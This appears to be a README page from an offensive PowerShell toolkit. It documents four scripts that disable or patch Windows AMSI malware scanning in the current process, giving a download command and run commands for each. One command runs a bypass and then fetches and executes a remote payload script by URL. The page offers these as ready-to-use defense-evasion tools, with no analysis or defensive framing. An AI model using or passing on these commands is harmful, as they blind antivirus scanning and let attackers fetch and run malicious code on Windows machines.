## AMSBP.ps1

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|AMSBP|Disable AMSI within current process|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
```

<br />

**execute:**
```powershell
Import-Module -Name ".\AMSBP.ps1" -Force
AMSBP
```

<br />

## Disable-Amsi.ps1
   
|Function Name|Description|Privileges|Notes|
|---|---|---|---|
|Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|3 bypass technics available (auto-sellection)<br />[Disable-Amsi cmdlet Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
```

<br />

**execute:**
```powershell
Import-Module -Name ".\Disable-Amsi.ps1" -Force
Disable-Amsi -DontDisableBlockLogging "true"
```   

<br />

## Invoke-Bypass.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|Invoke-Bypass|disable AMSI within current process + exec script through bypass?|User Land|4 bypass technics available (manual)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Invoke-Bypass.ps1" -OutFile "Invoke-Bypass.ps1"
```

<br />

**prerequisites:**
```
-filepath 'string' only accepts .ps1 .bat .vbs file formats
-payloadurl 'string' only accepts .ps1 .bat .vbs file formats
```
<br />

**execute:**
```powershell
Get-Help .\Invoke-Bypass.ps1 -full
.\Invoke-Bypass.ps1 -list "technic"
.\Invoke-Bypass.ps1 -technic "1"
.\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
.\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
.\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
```   

<br />

## ScanInterception.ps1
   
|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[ScanInterception](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Ams1-Bypass/ScanInterception.ps1)|Unchain AMSI by patching the provider’s unmonitored memory space|User Land|Available for x64 bytes only|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/ScanInterception.ps1" -OutFile "ScanInterception.ps1"
```

<br />

**execute:**
```powershell
#Test detection
amsiutils

#Patch amsi scan function
.\ScanInterception.ps1

#Test detection
amsiutils
```   
